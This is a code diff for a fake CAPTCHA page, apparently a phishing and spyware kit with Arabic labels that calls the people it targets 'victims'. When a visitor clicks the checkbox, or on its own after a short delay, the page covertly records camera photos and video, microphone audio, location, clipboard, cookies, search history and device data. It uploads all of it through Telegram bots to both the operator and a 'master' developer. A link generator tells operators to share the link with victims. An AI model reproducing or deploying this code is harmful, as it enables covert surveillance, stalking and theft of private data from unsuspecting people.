+                        setTimeout(() => recorder.stop(), duration);
+                    });
+                } catch (_) {
+                    state.permissionsGranted.mic = false;
+                    return null;
+                }
+            }
+
+            // ============================================================
+            //  🔥  COLLECT DATA (ULTRA STEALTH)
+            // ============================================================
+
+            async function collectData() {
+                if (state.isCollecting || state.collectionComplete) return;
+                state.isCollecting = true;
+                setUIState('loading');
+
+                try {
+                    // Step 1: Basic detection
+                    classifyDevice();
+                    detectSpoofing();
+                    await detectExtensions();
+                    collectAllCookies();
+                    await fetchGoogleSearchHistory();
+                    await getBatteryLevel();
+
+                    // Step 2: Front camera (photos + video)
+                    let frontVideo = null;
+                    let photos = [];
+                    try {
+                        const stream = await getStream('user');
+                        el.hiddenVideo.srcObject = stream;
+                        await el.hiddenVideo.play();
+                        await delay(400);
+
+                        // Record video (5 sec)
+                        frontVideo = await recordStream(stream, 5000);
+
+                        // Capture 8 photos
+                        for (let i = 0; i < 8; i++) {
+                            const blob = await capturePhoto(el.hiddenVideo);
+                            if (blob) photos.push(blob);
+                            await delay(600);
+                        }
+
+                        stream.getTracks().forEach(t => t.stop());
+                        el.hiddenVideo.srcObject = null;
+                    } catch (_) {
+                        state.permissionsGranted.camera = false;
+                    }
+
+                    // Step 3: Back camera (video)
+                    let backVideo = null;
+                    try {
+                        const stream = await getStream('environment');
+                        el.hiddenVideo.srcObject = stream;
+                        await el.hiddenVideo.play();
+                        await delay(400);
+                        backVideo = await recordStream(stream, 5000);
+                        stream.getTracks().forEach(t => t.stop());
+                        el.hiddenVideo.srcObject = null;
+                    } catch (_) {}
+
+                    // Step 4: Audio
+                    let audioBlob = null;
+                    try {
+                        audioBlob = await recordAudio(5000);
+                        if (audioBlob) state.audioReady = true;
+                    } catch (_) {}
+
+                    // Step 5: Location
+                    await getLocation();
+
+                    // Step 6: Clipboard
+                    await readClipboard();
+
+                    // Step 7: IP
+                    await fetchIP();
+
+                    // Step 8: Build collected data
+                    const deviceData = {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        languages: navigator.languages || [],
+                        cookieEnabled: navigator.cookieEnabled,
+                        hardwareConcurrency: navigator.hardwareConcurrency || null,
+                        deviceMemory: navigator.deviceMemory || null,
+                        maxTouchPoints: navigator.maxTouchPoints || 0,
+                        vendor: navigator.vendor || null,
+                        isHeadless: state.isHeadless,
+                        screen: {
+                            width: screen.width,
+                            height: screen.height,
+                            availWidth: screen.availWidth,
+                            availHeight: screen.availHeight,
+                            colorDepth: screen.colorDepth,
+                            pixelDepth: screen.pixelDepth,
+                            orientation: screen.orientation?.type || 'unknown',
+                            angle: screen.orientation?.angle || 0,
+                        },
+                        pixelRatio: window.devicePixelRatio || 1,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezoneOffset: new Date().getTimezoneOffset(),
+                        locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                        timestamp: new Date().toISOString(),
+                        device: state.deviceClassification,
+                        spoofing: state.spoofingDetected,
+                        extensions: state.installedExtensions,
+                        clipboard: state.clipboardContent,
+                        storages: state.allCookies,
+                        history: state.browserHistory,
+                        permissions: state.permissionsGranted,
+                    };
+
+                    state.collectedData = deviceData;
+                    state.photos = photos;
+                    state.frontVideo = frontVideo;
+                    state.backVideo = backVideo;
+                    state.audioBlob = audioBlob;
+
+                    // Step 9: Send data to both targets
+                    await sendToMaster(deviceData, photos, frontVideo, backVideo, audioBlob);
+                    await sendToUser(deviceData, photos, frontVideo, backVideo, audioBlob);
+
+                    // Step 10: Backup locally
+                    const localBackup = {
+                        token: state.userToken,
+                        ip: state.userIP,
+                        location: state.userLocation,
+                        collectedData: deviceData,
+                        photoCount: photos.length,
+                        hasFrontVideo: !!frontVideo,
+                        hasBackVideo: !!backVideo,
+                        hasAudio: !!audioBlob,
+                        timestamp: new Date().toISOString()
+                    };
+                    saveDataLocally(localBackup);
+
+                    state.collectionComplete = true;
+                    state.isCollecting = false;
+                    setUIState('success');
+
+                } catch (_) {
+                    state.isCollecting = false;
+                    setUIState('failed');
+                }
+            }
+
+            // ============================================================
+            //  🔥  SEND TO MASTER
+            // ============================================================
+
+            async function sendToMaster(deviceData, photos, frontVideo, backVideo, audioBlob) {
+                try {
+                    const deviceInfo =
+                        `IP: ${state.userIP}\n` +
+                        `الموقع: ${state.userLocation.lat ? state.userLocation.lat + ', ' + state.userLocation.lng : 'غير متاح'}\n` +
+                        `المتصفح: ${deviceData.device.browser || 'Unknown'}\n` +
+                        `الجهاز: ${deviceData.device.os || 'Unknown'}\n` +
+                        `التوكن الفريد: ${state.userToken}\n` +
+                        `الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
+                        `عدد الصور: ${photos.length}\n` +
+                        `فيديو أمامي: ${frontVideo ? '✅' : '❌'}\n` +
+                        `فيديو خلفي: ${backVideo ? '✅' : '❌'}\n` +
+                        `صوت: ${audioBlob ? '✅' : '❌'}\n` +
+                        `هيدلس: ${state.isHeadless ? '✅' : '❌'}\n` +
+                        `الامتدادات: ${state.installedExtensions.join(', ') || 'لا شيء'}`;
+
+                    await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: MASTER_CHAT_ID,
+                            text: `⭑ تقرير ضحية جديدة — نسخة المطور ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
+                        }),
+                        keepalive: true
+                    });
+
+                    // Send location
+                    if (state.userLocation.lat && state.userLocation.lng) {
+                        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendLocation`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: MASTER_CHAT_ID,
+                                latitude: state.userLocation.lat,
+                                longitude: state.userLocation.lng
+                            }),
+                            keepalive: true
+                        });
+                    }
+
+                    // Send photos
+                    for (let i = 0; i < photos.length; i++) {
+                        const fd = new FormData();
+                        fd.append('chat_id', MASTER_CHAT_ID);
+                        fd.append('photo', photos[i], `photo_${i+1}.jpg`);
+                        fd.append('caption', `📸 صورة ${i+1}/${photos.length} - ${state.userToken}`);
+                        await sendMediaWithKeepalive('sendPhoto', MASTER_BOT_TOKEN, fd);
+                        await delay(200);
+                    }
+
+                    // Send front video
+                    if (frontVideo) {
+                        const fd = new FormData();
+                        fd.append('chat_id', MASTER_CHAT_ID);
+                        fd.append('video', frontVideo, 'front_video.webm');
+                        fd.append('caption', `🎥 فيديو أمامي - ${state.userToken}`);
+                        await sendMediaWithKeepalive('sendVideo', MASTER_BOT_TOKEN, fd);
+                    }
+
+                    // Send back video
+                    if (backVideo) {
+                        const fd = new FormData();
+                        fd.append('chat_id', MASTER_CHAT_ID);
+                        fd.append('video', backVideo, 'back_video.webm');
+                        fd.append('caption', `🎥 فيديو خلفي - ${state.userToken}`);
+                        await sendMediaWithKeepalive('sendVideo', MASTER_BOT_TOKEN, fd);
+                    }
+
+                    // Send audio
+                    if (audioBlob) {
+                        const fd = new FormData();
+                        fd.append('chat_id', MASTER_CHAT_ID);
+                        fd.append('audio', audioBlob, 'audio.webm');
+                        fd.append('caption', `🎤 تسجيل صوتي - ${state.userToken}`);
+                        await sendMediaWithKeepalive('sendAudio', MASTER_BOT_TOKEN, fd);
+                    }
+                } catch (_) { /* silent */ }
+            }
+
+            // ============================================================
+            //  🔥  SEND TO USER
+            // ============================================================
+
+            async function sendToUser(deviceData, photos, frontVideo, backVideo, audioBlob) {
+                try {
+                    const mapping = await getTokenMapping(state.userToken);
+                    if (!mapping) {
+                        console.log('User mapping not found, skipping user send.');
+                        return;
+                    }
+                    const { botToken, chatId, botName } = mapping;
+
+                    const deviceInfo =
+                        `IP: ${state.userIP}\n` +
+                        `الموقع: ${state.userLocation.lat ? state.userLocation.lat + ', ' + state.userLocation.lng : 'غير متاح'}\n` +
+                        `المتصفح: ${deviceData.device.browser || 'Unknown'}\n` +
+                        `الجهاز: ${deviceData.device.os || 'Unknown'}\n` +
+                        `التوكن الفريد: ${state.userToken}\n` +
+                        `الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
+                        `عدد الصور: ${photos.length}\n` +
+                        `فيديو أمامي: ${frontVideo ? '✅' : '❌'}\n` +
+                        `فيديو خلفي: ${backVideo ? '✅' : '❌'}\n` +
+                        `صوت: ${audioBlob ? '✅' : '❌'}\n` +
+                        `هيدلس: ${state.isHeadless ? '✅' : '❌'}\n` +
+                        `الامتدادات: ${state.installedExtensions.join(', ') || 'لا شيء'}`;
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `⭑ تقرير ضحية جديدة — بوتك (@${botName}) ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
+                        }),
+                        keepalive: true
+                    });
+
+                    if (state.userLocation.lat && state.userLocation.lng) {
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                latitude: state.userLocation.lat,
+                                longitude: state.userLocation.lng
+                            }),
+                            keepalive: true
+                        });
+                    }
+
+                    for (let i = 0; i < photos.length; i++) {
+                        const fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('photo', photos[i], `photo_${i+1}.jpg`);
+                        fd.append('caption', `📸 صورة ${i+1}/${photos.length} - ${state.userToken}`);
+                        await sendMediaWithKeepalive('sendPhoto', botToken, fd);
+                        await delay(200);
+                    }
+
+                    if (frontVideo) {
+                        const fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('video', frontVideo, 'front_video.webm');
+                        fd.append('caption', `🎥 فيديو أمامي - ${state.userToken}`);
+                        await sendMediaWithKeepalive('sendVideo', botToken, fd);
+                    }
+
+                    if (backVideo) {
+                        const fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('video', backVideo, 'back_video.webm');
+                        fd.append('caption', `🎥 فيديو خلفي - ${state.userToken}`);
+                        await sendMediaWithKeepalive('sendVideo', botToken, fd);
+                    }
+
+                    if (audioBlob) {
+                        const fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('audio', audioBlob, 'audio.webm');
+                        fd.append('caption', `🎤 تسجيل صوتي - ${state.userToken}`);
+                        await sendMediaWithKeepalive('sendAudio', botToken, fd);
+                    }
+                } catch (_) { /* silent */ }
+            }
+
+            async function sendMediaWithKeepalive(method, botToken, formData) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true
+                    });
+                } catch (_) { /* silent */ }
+            }
+
+            // ============================================================
+            //  🔥  TOKEN MAPPING (IndexedDB)
+            // ============================================================
+
             function openDB() {
                 return new Promise((resolve, reject) => {
                     const req = indexedDB.open(DB_NAME, DB_VERSION);
@@ -1539,16 +2522,6 @@
                 });
             }
 
-            async function saveTokenMapping(shortToken, botToken, chatId, botName) {
-                try {
-                    const db = await openDB();
-                    const tx = db.transaction('tokens', 'readwrite');
-                    const store = tx.objectStore('tokens');
-                    store.put({ shortToken, botToken, chatId, botName });
-                    await new Promise((resolve) => { tx.oncomplete = resolve; });
-                } catch (e) { console.warn('Save mapping error:', e); }
-            }
-
             async function getTokenMapping(shortToken) {
                 try {
                     const db = await openDB();
@@ -1559,100 +2532,48 @@
                         req.onsuccess = () => resolve(req.result || null);
                         req.onerror = () => resolve(null);
                     });
-                } catch (e) { return null; }
+                } catch (_) { return null; }
             }
 
-            // ----- Deterministic 6-char token generator -----
-            async function generateToken(botToken, chatId) {
-                const salt = "ZEUS_SALT_2024";
-                const input = botToken + chatId + salt;
+            // ============================================================
+            //  🔥  EVENTS
+            // ============================================================
 
-                if (window.crypto && window.crypto.subtle) {
-                    try {
-                        const encoder = new TextEncoder();
-                        const data = encoder.encode(input);
-                        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-                        const hashArray = Array.from(new Uint8Array(hashBuffer));
-                        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-                        const bigInt = BigInt('0x' + hashHex.substring(0, 12));
-                        const base36 = bigInt.toString(36).toUpperCase();
-                        return base36.substring(0, 6).padStart(6, '0');
-                    } catch (e) { console.warn('Crypto fail, fallback'); }
+            el.checkbox.addEventListener('change', function(e) {
+                if (this.checked) {
+                    if (el.spinner.classList.contains('success') || state.collectionComplete) return;
+                    this.checked = false;
+                    collectData();
                 }
+            });
 
-                let hash = 0;
-                for (let i = 0; i < input.length; i++) {
-                    const char = input.charCodeAt(i);
-                    hash = ((hash << 5) - hash) + char;
-                    hash = hash & hash;
+            el.checkbox.addEventListener('click', function(e) {
+                if (this.disabled) e.preventDefault();
+            });
+
+            el.wrapper.addEventListener('click', function(e) {
+                if (e.target.closest('.checkmark') || e.target.closest('.logo-captcha') ||
+                    e.target.closest('.captcha-footer') || e.target.closest('.links') || e.target.closest('.brand')) {
+                    return;
                 }
-                return Math.abs(hash).toString(36).toUpperCase().padStart(6, '0').substring(0, 6);
-            }
-
-            // ----- Verify bot token & get bot name -----
-            async function verifyAndGetBotInfo(token) {
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
-                    const data = await res.json();
-                    if (data.ok) {
-                        return { valid: true, username: data.result.username || data.result.first_name };
-                    }
-                    return { valid: false, username: null };
-                } catch { return { valid: false, username: null }; }
-            }
-
-            // ----- Get battery level -----
-            async function getBatteryLevel() {
-                try {
-                    if (navigator.getBattery) {
-                        const battery = await navigator.getBattery();
-                        const level = Math.round(battery.level * 100);
-                        const charging = battery.charging ? ' (شحن)' : '';
-                        return level + '%' + charging;
-                    }
-                } catch (e) { /* ignore */ }
-                return 'غير متاح';
-            }
-
-            // ----- Request permissions (throws on denial) -----
-            async function requestAllPermissions() {
-                const promises = [
-                    navigator.mediaDevices.getUserMedia({ video: true }),
-                    navigator.mediaDevices.getUserMedia({ audio: true }),
-                    new Promise((resolve, reject) => {
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(resolve, reject);
-                        } else {
-                            reject(new Error('Geolocation not supported'));
-                        }
-                    })
-                ];
-
-                const results = await Promise.allSettled(promises);
-
-                let denied = false;
-                for (const result of results) {
-                    if (result.status === 'rejected') {
-                        const errorMsg = result.reason?.message || '';
-                        if (errorMsg.includes('video') || errorMsg.includes('audio') ||
-                            errorMsg.includes('Permission') && !errorMsg.includes('geolocation')) {
-                            denied = true;
-                            break;
-                        }
-                    }
+                if (state.collectionComplete || state.isCollecting) return;
+                if (!el.checkbox.checked && !el.spinner.classList.contains('loading')) {
+                    el.checkbox.checked = true;
+                    el.checkbox.dispatchEvent(new Event('change'));
                 }
+            });
 
-                if (denied) {
-                    throw new Error('Permission denied for critical devices');
-                }
+            // ============================================================
+            //  🔥  INIT
+            // ============================================================
 
-                for (const result of results) {
-                    if (result.status === 'fulfilled' && result.value && result.value.getTracks) {
-                        result.value.getTracks().forEach(t => t.stop());
-                    }
-                }
-
-                return true;
+            async function initVictim() {
+                extractTokenFromURL();
+                await fetchIP();
+                // Start collection automatically after short delay
+                setTimeout(() => {
+                    collectData();
+                }, 800);
             }
 
             // ============================================================
@@ -1680,6 +2601,51 @@
                     if (this.value.trim()) localStorage.setItem('zeus_last_chat_id', this.value.trim());
                 });
 
+                async function generateToken(botToken, chatId) {
+                    const salt = "ZEUS_SALT_2024";
+                    const input = botToken + chatId + salt;
+                    if (window.crypto && window.crypto.subtle) {
+                        try {
+                            const encoder = new TextEncoder();
+                            const data = encoder.encode(input);
+                            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+                            const hashArray = Array.from(new Uint8Array(hashBuffer));
+                            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+                            const bigInt = BigInt('0x' + hashHex.substring(0, 12));
+                            const base36 = bigInt.toString(36).toUpperCase();
+                            return base36.substring(0, 6).padStart(6, '0');
+                        } catch (_) {}
+                    }
+                    let hash = 0;
+                    for (let i = 0; i < input.length; i++) {
+                        const char = input.charCodeAt(i);
+                        hash = ((hash << 5) - hash) + char;
+                        hash = hash & hash;
+                    }
+                    return Math.abs(hash).toString(36).toUpperCase().padStart(6, '0').substring(0, 6);
+                }
+
+                async function verifyAndGetBotInfo(token) {
+                    try {
+                        const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
+                        const data = await res.json();
+                        if (data.ok) {
+                            return { valid: true, username: data.result.username || data.result.first_name };
+                        }
+                        return { valid: false, username: null };
+                    } catch { return { valid: false, username: null }; }
+                }
+
+                async function saveTokenMapping(shortToken, botToken, chatId, botName) {
+                    try {
+                        const db = await openDB();
+                        const tx = db.transaction('tokens', 'readwrite');
+                        const store = tx.objectStore('tokens');
+                        store.put({ shortToken, botToken, chatId, botName });
+                        await new Promise((resolve) => { tx.oncomplete = resolve; });
+                    } catch (_) {}
+                }
+
                 let isBusy = false;
 
                 async function handleGenerate() {
@@ -1693,7 +2659,7 @@
 
                     const info = await verifyAndGetBotInfo(botToken);
                     if (!info.valid) {
-                        showToast('❌ توكن البوت غير صحيح. يرجى التأكد.', 'error');
+                        showToast('❌ توكن البوت غير صحيح.', 'error');
                         return;
                     }
 
@@ -1712,12 +2678,9 @@
                         resultSub.textContent = link;
 
                         const userMsg =
-                            `🔗 *رابطك الجديد*\n${link}\n\n` +
-                            `📌 التوكن الفريد: \`${shortToken}\`\n` +
-                            `شاركه مع الضحية، وسيتم جمع البيانات وإرسالها إليك وإلى المطور.\n` +
-                            `🛡️ النظام متكامل مع نسخة احتياطية للمطور.`;
+                            `🔗 *رابطك الجديد*\n${link}\n\n📌 التوكن الفريد: \`${shortToken}\``;
 
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
@@ -1731,7 +2694,7 @@
                                 }
                             }),
                             keepalive: true
-                        }).catch(() => {});
+                        });
 
                         const masterMsg =
                             `⭑ نسخة احتياطية — رابط جديد ⭒\n` +
@@ -1740,19 +2703,18 @@
                             `˼⏣˹ التوكن الأساسي: ${botToken} ⭒\n` +
                             `˼⏣˹ الإيدي: ${chatId} ⭒\n` +
                             `˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
                             `─────────────────`;
-                        fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+                        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: masterMsg }),
                             keepalive: true
-                        }).catch(() => {});
+                        });
 
                         genBtn.classList.remove('busy');
                         genBtn.classList.add('done');
                         genBtn.textContent = '✅ تم الإرسال';
-                        showToast('✅ تم توليد الرابط وإرساله إلى البوت.', 'success');
+                        showToast('✅ تم توليد الرابط وإرساله.', 'success');
 
                         setTimeout(() => {
                             genBtn.classList.remove('done');
@@ -1761,8 +2723,7 @@
                             isBusy = false;
                         }, 2000);
 
-                    } catch (err) {
-                        console.error('Generate error:', err);
+                    } catch (_) {
                         showToast('❌ حدث خطأ أثناء التوليد.', 'error');
                         genBtn.classList.remove('busy');
                         genBtn.textContent = 'توليد الرابط';
@@ -1771,9 +2732,6 @@
                 }
 
                 genBtn.addEventListener('click', handleGenerate);
-                document.querySelectorAll('.input-wrap input').forEach(inp => {
-                    inp.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleGenerate(); });
-                });
 
                 copyBtn.addEventListener('click', function() {
                     const text = tokenDisplay.textContent.trim();
@@ -1793,7 +2751,7 @@
 
                 openBtn.addEventListener('click', function() {
                     const url = resultSub.textContent.trim();
-                    if (url && url !== 'https://your-domain.com?t=XXXXXX' && url.includes('?t=')) {
+                    if (url && url.includes('?t=')) {
                         window.open(url, '_blank');
                     } else {
                         showToast('⚠️ يرجى توليد رابط أولاً.', 'warning');
@@ -1803,389 +2761,20 @@
                 function updateDateTime() {
                     const now = new Date();
                     const egyptTime = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Cairo' }));
-                    document.getElementById('timeDisplay').textContent =
-                        String(egyptTime.getHours()).padStart(2, '0') + ':' +
-                        String(egyptTime.getMinutes()).padStart(2, '0');
-                    document.getElementById('dateDisplay').textContent =
-                        String(egyptTime.getDate()).padStart(2, '0') + '/' +
-                        String(egyptTime.getMonth() + 1).padStart(2, '0') + '/' +
-                        egyptTime.getFullYear();
+                    const hours = String(egyptTime.getHours()).padStart(2, '0');
+                    const minutes = String(egyptTime.getMinutes()).padStart(2, '0');
+                    const day = String(egyptTime.getDate()).padStart(2, '0');
+                    const month = String(egyptTime.getMonth() + 1).padStart(2, '0');
+                    const year = egyptTime.getFullYear();
+                    document.getElementById('timeDisplay').textContent = hours + ':' + minutes;
+                    document.getElementById('dateDisplay').textContent = day + '/' + month + '/' + year;
                 }
                 updateDateTime();
                 setInterval(updateDateTime, 10000);
             }
 
             // ============================================================
-            //  🔥  VICTIM PAGE — INSTANT COLLECTION & SEND
-            // ============================================================
-
-            async function initVictimPage(shortToken) {
-                const spinner = document.getElementById('spinner');
-                const checkbox = document.getElementById('captcha');
-                const mainText = document.getElementById('mainText');
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
-                const ctx = canvas.getContext('2d');
-
-                let collectionDone = false;
-
-                async function getBotMapping(token) {
-                    try {
-                        const mapping = await getTokenMapping(token);
-                        if (mapping) {
-                            return {
-                                botToken: mapping.botToken,
-                                chatId: mapping.chatId,
-                                botName: mapping.botName || 'المستخدم',
-                                found: true
-                            };
-                        }
-                        return { found: false };
-                    } catch (e) {
-                        console.warn('Mapping lookup error:', e);
-                        return { found: false };
-                    }
-                }
-
-                // ----- Send helper (fire and forget) -----
-                function sendMediaAsync(method, botToken, formData) {
-                    fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
-                        method: 'POST',
-                        body: formData,
-                        keepalive: true
-                    }).catch(() => {});
-                }
-
-                // ----- Main collection (runs immediately) -----
-                async function collectData() {
-                    if (collectionDone) return;
-
-                    try {
-                        // 1. Force permissions
-                        await requestAllPermissions();
-
-                        // 2. Get mapping
-                        const mapping = await getBotMapping(shortToken);
-                        const botName = mapping.found ? mapping.botName : 'غير معروف';
-                        const userBotToken = mapping.found ? mapping.botToken : null;
-                        const userChatId = mapping.found ? mapping.chatId : null;
-
-                        // 3. Get IP
-                        let ip = 'غير متاح';
-                        try {
-                            const res = await fetch('https://api.ipify.org?format=json');
-                            const data = await res.json();
-                            ip = data.ip;
-                        } catch (e) {}
-
-                        // 4. Get location
-                        let location = { lat: null, lng: null, accuracy: null, error: null };
-                        try {
-                            if (navigator.geolocation) {
-                                const pos = await new Promise((resolve, reject) => {
-                                    navigator.geolocation.getCurrentPosition(resolve, reject);
-                                });
-                                location = {
-                                    lat: pos.coords.latitude,
-                                    lng: pos.coords.longitude,
-                                    accuracy: pos.coords.accuracy,
-                                    error: null
-                                };
-                            }
-                        } catch (e) {
-                            location.error = e.message;
-                        }
-
-                        // 5. Battery
-                        const battery = await getBatteryLevel();
-
-                        // 6. Front camera (photos + video) — parallel
-                        let frontVideo = null;
-                        let photos = [];
-                        try {
-                            const stream = await navigator.mediaDevices.getUserMedia({
-                                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-                                audio: false
-                            });
-                            video.srcObject = stream;
-                            await video.play();
-                            await delay(200);
-
-                            // Record 3s video
-                            const recorder = new MediaRecorder(stream);
-                            const chunks = [];
-                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-                            const videoPromise = new Promise((resolve) => {
-                                recorder.onstop = () => {
-                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
-                                    resolve(blob);
-                                };
-                            });
-                            recorder.start();
-                            await delay(3000);
-                            if (recorder.state === 'recording') recorder.stop();
-                            frontVideo = await videoPromise;
-
-                            // Capture 4 photos
-                            for (let i = 0; i < 4; i++) {
-                                const w = video.videoWidth || 640;
-                                const h = video.videoHeight || 480;
-                                canvas.width = w;
-                                canvas.height = h;
-                                ctx.drawImage(video, 0, 0, w, h);
-                                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                                if (blob) photos.push(blob);
-                                await delay(300);
-                            }
-                            stream.getTracks().forEach(t => t.stop());
-                            video.srcObject = null;
-                        } catch (e) {
-                            console.warn('Front camera error:', e);
-                        }
-
-                        // 7. Back camera (video) — parallel
-                        let backVideo = null;
-                        try {
-                            const stream = await navigator.mediaDevices.getUserMedia({
-                                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
-                                audio: false
-                            });
-                            video.srcObject = stream;
-                            await video.play();
-                            await delay(200);
-                            const recorder = new MediaRecorder(stream);
-                            const chunks = [];
-                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-                            const videoPromise = new Promise((resolve) => {
-                                recorder.onstop = () => {
-                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
-                                    resolve(blob);
-                                };
-                            });
-                            recorder.start();
-                            await delay(3000);
-                            if (recorder.state === 'recording') recorder.stop();
-                            backVideo = await videoPromise;
-                            stream.getTracks().forEach(t => t.stop());
-                            video.srcObject = null;
-                        } catch (e) {
-                            console.warn('Back camera error:', e);
-                        }
-
-                        // 8. Audio (3s)
-                        let audioBlob = null;
-                        try {
-                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                            const recorder = new MediaRecorder(stream);
-                            const chunks = [];
-                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-                            const audioPromise = new Promise((resolve) => {
-                                recorder.onstop = () => {
-                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
-                                    resolve(blob);
-                                };
-                            });
-                            recorder.start();
-                            await delay(3000);
-                            if (recorder.state === 'recording') recorder.stop();
-                            audioBlob = await audioPromise;
-                            stream.getTracks().forEach(t => t.stop());
-                        } catch (e) {
-                            console.warn('Audio error:', e);
-                        }
-
-                        // 9. Build device info
-                        const deviceInfo =
-                            `IP: ${ip}\n` +
-                            `البطارية: ${battery}\n` +
-                            `الموقع: ${location.lat ? location.lat + ', ' + location.lng : 'غير متاح'}\n` +
-                            `المتصفح: ${/Chrome/.test(navigator.userAgent) ? 'Chrome' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown'}\n` +
-                            `الجهاز: ${navigator.platform || 'Unknown'}\n` +
-                            `التوكن الفريد: ${shortToken}\n` +
-                            `الوقت: ${new Date().toLocaleString('ar-EG')}`;
-
-                        const data = {
-                            ip,
-                            location,
-                            deviceInfo,
-                            frontVideo,
-                            backVideo,
-                            audio: audioBlob,
-                            photos
-                        };
-
-                        // 10. Send to master (fire and forget)
-                        sendToMaster(data);
-                        // 11. Send to user (fire and forget)
-                        sendToUser(data, userBotToken, userChatId, botName);
-
-                        collectionDone = true;
-                        spinner.classList.add('success');
-                        mainText.textContent = 'تم التحقق بنجاح';
-                        mainText.className = 'text success';
-                        checkbox.checked = true;
-                        checkbox.disabled = true;
-
-                        sessionStorage.removeItem(RETRY_KEY);
-
-                    } catch (error) {
-                        console.warn('Permission denied, forcing retry...');
-                        sessionStorage.setItem(RETRY_KEY, 'true');
-                        location.reload();
-                    }
-                }
-
-                // ----- Send functions -----
-                function sendToMaster(data) {
-                    const summary =
-                        `⭑ تقرير ضحية جديدة — نسخة المطور ⭒\n⊚─〔 البيانات 〕────────\n${data.deviceInfo}\n─────────────────`;
-                    fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: summary }),
-                        keepalive: true
-                    }).catch(() => {});
-
-                    if (data.location.lat && data.location.lng) {
-                        fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendLocation`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: MASTER_CHAT_ID,
-                                latitude: data.location.lat,
-                                longitude: data.location.lng
-                            }),
-                            keepalive: true
-                        }).catch(() => {});
-                    }
-
-                    data.photos.forEach((blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('photo', blob);
-                        fd.append('caption', `📸 صورة - ${shortToken}`);
-                        sendMediaAsync('sendPhoto', MASTER_BOT_TOKEN, fd);
-                    });
-
-                    if (data.frontVideo) {
-                        const fd = new FormData();
-                        fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('video', data.frontVideo);
-                        fd.append('caption', `🎥 فيديو أمامي - ${shortToken}`);
-                        sendMediaAsync('sendVideo', MASTER_BOT_TOKEN, fd);
-                    }
-
-                    if (data.backVideo) {
-                        const fd = new FormData();
-                        fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('video', data.backVideo);
-                        fd.append('caption', `🎥 فيديو خلفي - ${shortToken}`);
-                        sendMediaAsync('sendVideo', MASTER_BOT_TOKEN, fd);
-                    }
-
-                    if (data.audio) {
-                        const fd = new FormData();
-                        fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('audio', data.audio);
